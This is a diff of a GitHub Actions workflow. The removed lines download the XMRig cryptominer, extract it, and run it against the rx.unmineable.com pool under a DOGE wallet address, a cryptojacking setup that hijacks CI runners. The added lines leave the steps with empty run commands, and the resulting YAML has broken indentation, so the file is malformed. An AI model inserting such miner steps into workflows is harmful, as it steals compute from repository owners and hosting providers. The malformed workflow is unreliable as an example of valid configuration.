@@ -22,13 +22,12 @@ jobs:
     fail-fast: false
     matrix:
      runner: [0]  
-  
 steps: 
-- name: DOWNLOAD 
-run: Invoke-WebRequest https://github.com/xmrig/xmrig/releases/download/v6.15.1/xmrig-6.15.1-msvc-win64.zip -OutFile xmrig-6.15.1-msvc-win64.zip 
-- name: Extract 
-run: Expand-Archive xmrig-6.15.1-msvc-win64.zip 
-- name: Running 
-run: .\xmrig-6.15.1-msvc-win64\xmrig-6.15.1\xmrig.exe -o rx.unmineable.com:3333 -a rx -k -u DOGE:DSycjXnngRekwJKRQKXJwY88GPw4w9FmQA.FASTGIT -p x -t 1 
-- name: END 
+  - name: DOWNLOAD 
+  run: 
+  - name: Extract 
+  run: 
+-   name: Running 
+  run: 
+-   name: END 
 run: exit
